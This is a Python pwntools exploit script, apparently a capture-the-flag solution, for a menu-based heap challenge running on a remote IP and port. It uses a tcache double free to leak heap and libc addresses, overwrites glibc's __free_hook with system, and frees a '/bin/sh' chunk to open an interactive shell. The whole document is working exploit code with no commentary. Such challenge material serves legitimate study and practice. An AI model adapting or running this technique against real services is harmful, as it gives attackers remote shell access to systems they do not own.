#!/usr/bin/env python3

from pwn import *

def create(io, size, content):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvline()
    io.sendline(size)
    io.recvline()
    io.sendline(content)

def delete(io):
    io.recvuntil('choice :')
    io.sendline('3')

def view(io):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvline()
    io.recvline()
    return io.recvline()[:-1]



"""io = process('patched_chall')"""
io = remote('34.121.211.139', 4444)

create(io, '62', 'A'*62)

for i in range(4):
    delete(io)

heap_leak = struct.unpack('<Q', view(io).ljust(8, b'\x00'))[0]
print(hex(heap_leak))

create(io, '62', p64(0)+b'A'*8)
create(io, '62', 'A'*8)

for i in range(4):
    create(io, '62', p64(heap_leak) + p64(0x91)*3)

delete(io)
delete(io)

create(io, '62', p64(heap_leak+0x60))
create(io, '62', 'A'*8)
create(io, '62', 'A'*8)

for i in range(8):
    delete(io)

libc_leak = struct.unpack('<Q', view(io).ljust(8, b'\x00'))[0]
print(hex(libc_leak))
libc_base = libc_leak - 0x3ebca0

libc = ELF('./libc-2.27.so')
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

print(hex(system))
print(hex(free_hook))

create(io, '8', 'A'*8)

delete(io)
delete(io)

create(io, '8', p64(free_hook))
create(io, '8', p64(0))
create(io, '8', p64(system))

create(io, '8', '/bin/sh\x00')
delete(io)

io.interactive()
